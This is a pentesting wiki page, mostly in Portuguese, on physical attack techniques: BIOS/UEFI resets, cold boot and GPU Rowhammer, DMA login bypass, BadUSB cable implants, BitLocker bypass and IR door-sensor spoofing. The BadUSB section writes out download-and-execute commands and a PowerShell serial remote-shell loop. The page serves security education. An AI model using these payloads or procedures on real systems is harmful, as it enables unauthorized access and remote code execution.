# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS** pode ser feito de várias maneiras. A maioria das placas-mãe inclui uma **battery** que, quando removida por cerca de **30 minutos**, redefinirá as configurações da BIOS, incluindo a senha. Como alternativa, um **jumper on the motherboard** pode ser ajustado para redefinir essas configurações conectando pinos específicos.

Para situações em que ajustes de hardware não são possíveis ou práticos, **software tools** oferecem uma solução. Executar um sistema a partir de um **Live CD/USB** com distribuições como **Kali Linux** fornece acesso a ferramentas como **_killCmos_** e **_CmosPWD_**, que podem ajudar na recuperação da senha da BIOS.

Em casos em que a senha da BIOS é desconhecida, inseri-la incorretamente **three times** normalmente resultará em um código de erro. Esse código pode ser usado em sites como [https://bios-pw.org](https://bios-pw.org) para potencialmente recuperar uma senha utilizável.

### UEFI Security

Para sistemas modernos que usam **UEFI** em vez da BIOS tradicional, a ferramenta **chipsec** pode ser utilizada para analisar e modificar configurações UEFI, incluindo a desativação do **Secure Boot**. Isso pode ser feito com o seguinte comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Análise de RAM e Ataques Cold Boot

A RAM retém dados por pouco tempo após a energia ser cortada, normalmente por **1 a 2 minutos**. Essa persistência pode ser estendida para **10 minutos** aplicando substâncias frias, como nitrogênio líquido. Durante esse período estendido, um **memory dump** pode ser criado usando ferramentas como **dd.exe** e **volatility** para análise.

---

## GPU Rowhammer Contra Page Tables

Ataques modernos de GPU Rowhammer tornam-se muito mais úteis quando têm como alvo **GPU virtual-memory metadata** em vez de buffers comuns. Trabalhos recentes em **GDDR6 NVIDIA Ampere GPUs** mostram que um atacante executando código CUDA sem privilégios pode construir padrões de hammering específicos para GPU, usar **memory massaging** para colocar estruturas de paging em rows vulneráveis e então flip bits no **last-level page table** ou em um **page directory** intermediário. Assim que uma única translation entry é corrompida, o atacante pode iniciar **arbitrary GPU memory read/write** e então pivotar para a compromise do host.

### Padrão de Exploração

1. **Profile hammerable rows** em GDDR6 e construa padrões de hammering sensíveis a refresh / não uniformes que contornem mitigações in-DRAM.
2. **Massage GPU allocations** para que o driver coloque estruturas de page-translation em localizações físicas hammerable em vez de mantê-las no pool protegido padrão. Na prática, isso pode significar esgotar a região de page-table de low-memory e fazer spray de grandes UVM mappings sparse com strides controlados.
3. **Flip translation metadata** como **PFN** ou bits relacionados à aperture dentro de uma page-table / page-directory entry para que a virtual page controlada pelo atacante resolva para páginas de page-table, arbitrary GPU memory, ou mapeamentos de system visíveis ao host.
4. Reutilize o mapeamento forjado para reescrever entradas adicionais de translation e escalar para **arbitrary GPU memory read/write** entre contextos de GPU.

### Pivot para o Host e Mitigações

- Com **IOMMU disabled**, mapeamentos forjados de system aperture podem expor arbitrary **host physical memory** à GPU, transformando a primitive da GPU em compromise total do host.
- **GDDRHammer** mira entradas de last-level page-table, enquanto **GeForge** mostra que corromper um nível de page-directory pode ser mais fácil porque um bit flip pode redirecionar uma subtree de translation maior. Não trate apenas uma camada de paging como crítica para a segurança.
- **IOMMU** ainda importa porque bloqueia o caminho direto de arbitrary-host-memory usado por GDDRHammer/GeForge, mas **não é uma mitigação completa**. **GPUBreach** mostra um pivot de segunda etapa em que o atacante corrompe buffers da CPU graváveis pela GPU, de propriedade do driver, e então aciona bugs de memory-safety do driver NVIDIA para obter uma kernel write primitive e uma **root shell** mesmo com IOMMU habilitado.
- **System-level ECC** é uma medida prática de hardening em GPUs workstation/server suportadas. GPUs de consumo sem ECC expõem uma superfície de defesa mais fraca.
- Esses ataques não são puramente teóricos: **GeForge** relatou **1.171** bit flips em uma RTX 3060 e **202** em uma RTX A6000, o suficiente para construir uma cadeia funcional de escalation de privilégios no host.

---

## Ataques de Direct Memory Access (DMA)

**INCEPTION** é uma ferramenta projetada para **physical memory manipulation** via DMA, compatível com interfaces como **FireWire** e **Thunderbolt**. Ela permite burlar procedimentos de login patchando a memória para aceitar qualquer senha. No entanto, é ineficaz contra sistemas **Windows 10**.

---

## Live CD/USB para Acesso ao Sistema

Substituir binários do sistema como **_sethc.exe_** ou **_Utilman.exe_** por uma cópia de **_cmd.exe_** pode fornecer um command prompt com privilégios de sistema. Ferramentas como **chntpw** podem ser usadas para editar o arquivo **SAM** de uma instalação do Windows, permitindo alterações de senha.

**Kon-Boot** é uma ferramenta que facilita o login em sistemas Windows sem conhecer a senha, modificando temporariamente o kernel do Windows ou o UEFI. Mais informações podem ser encontradas em [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Manipulação de Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Acessa as configurações da BIOS.
- **F8**: Entra no modo Recovery.
- Pressionar **Shift** após o banner do Windows pode burlar o autologon.

### Dispositivos BAD USB

Dispositivos como **Rubber Ducky** e **Teensyduino** servem como plataformas para criar dispositivos **bad USB**, capazes de executar payloads predefinidos quando conectados a um computador alvo.

### Volume Shadow Copy

Privilégios de administrador permitem a criação de cópias de arquivos sensíveis, incluindo o arquivo **SAM**, via PowerShell.

## BadUSB / Técnicas de HID Implant

### Implantes de cabo gerenciados por Wi-Fi

- Implantes baseados em ESP32-S3 como o **Evil Crow Cable Wind** se escondem dentro de cabos USB-A→USB-C ou USB-C↔USB-C, se enumeram apenas como um teclado USB e expõem seu stack de C2 via Wi-Fi. O operador só precisa energizar o cabo a partir do host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789` e acessar [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para chegar à interface HTTP embarcada.
- A interface do navegador fornece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. Os payloads armazenados são marcados por OS, os layouts de teclado são alternados dinamicamente, e as strings VID/PID podem ser alteradas para imitar periféricos conhecidos.
- Como o C2 vive dentro do cabo, um telefone pode preparar payloads, disparar a execução e gerenciar credenciais de Wi-Fi sem tocar o OS do host — ideal para intrusões físicas de curta permanência.

### Payloads AutoExec cientes do OS

- As regras AutoExec vinculam um ou mais payloads para serem executados imediatamente após a enumeração USB. O implant faz um fingerprinting leve do OS e seleciona o script correspondente.
- Fluxo de trabalho de exemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como a execução é desassistida, simplesmente trocar um cabo de carregamento pode obter acesso inicial “plug-and-pwn” sob o contexto do usuário autenticado.

### Remote shell via Wi-Fi TCP iniciada por HID

1. **Keystroke bootstrap:** Um payload armazenado abre um console e cola um loop que executa qualquer coisa que chegue no novo USB serial device. Uma variante mínima para Windows é:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** O implant mantém o canal USB CDC aberto enquanto seu ESP32-S3 inicia um cliente TCP (Python script, Android APK, or desktop executable) de volta para o operador. Qualquer byte digitado na sessão TCP é encaminhado para o loop serial acima, permitindo execução remota de comandos até mesmo em hosts air-gapped. A saída é limitada, então os operadores normalmente executam blind commands (criação de conta, staging de ferramentas adicionais, etc.).

### HTTP OTA update surface

- O mesmo web stack normalmente expõe atualizações de firmware sem autenticação. Evil Crow Cable Wind escuta em `/update` e grava qualquer binary que seja enviado:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypass de Criptografia do BitLocker

A criptografia do BitLocker pode potencialmente ser contornada se a **senha de recuperação** for encontrada dentro de um arquivo de dump de memória (**MEMORY.DMP**). Ferramentas como **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** podem ser utilizadas para esse propósito.

---

## Engenharia Social para Adição de Recovery Key

Uma nova recovery key do BitLocker pode ser adicionada por meio de táticas de engenharia social, convencendo um usuário a executar um comando que adiciona uma nova recovery key composta por zeros, simplificando assim o processo de decriptação.

---

## Explorando Chassis Intrusion / Maintenance Switches para Factory-Reset da BIOS

Muitos laptops modernos e desktops de fator de forma pequeno incluem um **chassis-intrusion switch** que é monitorado pelo Embedded Controller (EC) e pelo firmware da BIOS/UEFI. Embora o objetivo principal do switch seja emitir um alerta quando um dispositivo é aberto, os fabricantes às vezes implementam um **atalho de recuperação não documentado** que é acionado quando o switch é alternado em um padrão específico.

### Como o Ataque Funciona

1. O switch está ligado a uma **interrupção GPIO** no EC.
2. O firmware executado no EC acompanha o **tempo e o número de acionamentos**.
3. Quando um padrão codificado é reconhecido, o EC invoca uma rotina de *mainboard-reset* que **apaga o conteúdo do NVRAM/CMOS do sistema**.
4. Na próxima inicialização, a BIOS carrega valores padrão – **a senha do supervisor, as chaves do Secure Boot e toda configuração personalizada são apagadas**.

> Assim que o Secure Boot é desativado e a senha do firmware desaparece, o atacante pode simplesmente inicializar qualquer imagem externa de sistema operacional e obter acesso irrestrito às unidades internas.

### Exemplo do Mundo Real – Framework 13 Laptop

O atalho de recuperação para o Framework 13 (11th/12th/13th-gen) é:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Após o décimo ciclo, o EC define uma flag que instrui o BIOS a apagar a NVRAM no próximo reboot. Todo o procedimento leva ~40 s e requer **nada além de uma chave de fenda**.

### Generic Exploitation Procedure

1. Ligue ou suspend-resume o target para que o EC esteja em execução.
2. Remova a tampa inferior para expor o switch de intrusion/maintenance.
3. Reproduza o padrão de alternância específico do vendor (consulte documentação, fóruns ou reverse-engineer o firmware do EC).
4. Remonte e reboot – as proteções de firmware devem estar desativadas.
5. Inicie um live USB (por exemplo, Kali Linux) e faça a usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Registre eventos de chassis-intrusion no console de gerenciamento do OS e correlacione com resets inesperados de BIOS.
* Empregue **tamper-evident seals** nos parafusos/capas para detectar abertura.
* Mantenha dispositivos em **áreas fisicamente controladas**; assuma que acesso físico equivale a comprometimento total.
* Onde disponível, desative o recurso do vendor “maintenance switch reset” ou exija uma autorização criptográfica adicional para resets de NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Sensores commodity “wave-to-exit” emparelham um emissor LED near-IR com um módulo receptor estilo controle remoto de TV que só reporta logic high depois de ter visto múltiplos pulsos (~4–10) do carrier correto (≈30 kHz).
- Uma proteção plástica bloqueia o emissor e o receptor de se verem diretamente, então o controller assume que qualquer carrier validado veio de uma reflexão próxima e aciona um relay que abre o door strike.
- Uma vez que o controller acredita que um target está presente, ele frequentemente altera a outbound modulation envelope, mas o receiver continua aceitando qualquer burst que corresponda ao carrier filtrado.

### Attack Workflow
1. **Capture o emission profile** – conecte um logic analyser aos pinos do controller para registrar tanto as waveforms pre-detection quanto post-detection que dirigem o IR LED interno.
2. **Replay only the “post-detection” waveform** – remova/ignore o emissor padrão e dirija um IR LED externo com o padrão já acionado desde o início. Como o receiver só se importa com pulse count/frequency, ele trata o carrier falsificado como uma reflexão genuína e afirma a linha do relay.
3. **Gate the transmission** – transmita o carrier em bursts ajustados (por exemplo, dezenas de milissegundos ligado, intervalo semelhante desligado) para entregar o mínimo pulse count sem saturar o AGC do receiver ou a lógica de tratamento de interferência. Emissão contínua rapidamente dessensibiliza o sensor e impede o disparo do relay.

### Long-Range Reflective Injection
- Substituir o LED de bancada por um diodo IR de alta potência, driver MOSFET e optics de foco permite disparo confiável de ~6 m de distância.
- O attacker não precisa de line-of-sight para a abertura do receiver; apontar o feixe para paredes internas, prateleiras ou door frames visíveis através de glass permite que a energia refletida entre no field of view de ~30° e imite um wave de mão a curta distância.
- Como os receivers esperam apenas reflections fracas, um feixe externo muito mais forte pode ricochetear em múltiplas superfícies e ainda permanecer acima do detection threshold.

### Weaponised Attack Torch
- Integrar o driver dentro de uma lanterna comercial esconde a ferramenta à vista de todos. Troque o LED visível por um IR LED de alta potência compatível com a band do receiver, adicione um ATtiny412 (ou similar) para gerar os bursts de ≈30 kHz e use um MOSFET para drenar a corrente do LED.
- Uma lente zoom telescópica estreita o feixe para range/precision, enquanto um motor de vibração sob controle do MCU fornece confirmação háptica de que a modulation está ativa sem emitir luz visível.
- Ciclar por vários stored modulation patterns (frequências de carrier e envelopes ligeiramente diferentes) aumenta a compatibilidade entre famílias de sensors renomeadas, permitindo ao operator varrer superfícies refletivas até que o relay faça um clique audível e a door seja destravada.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
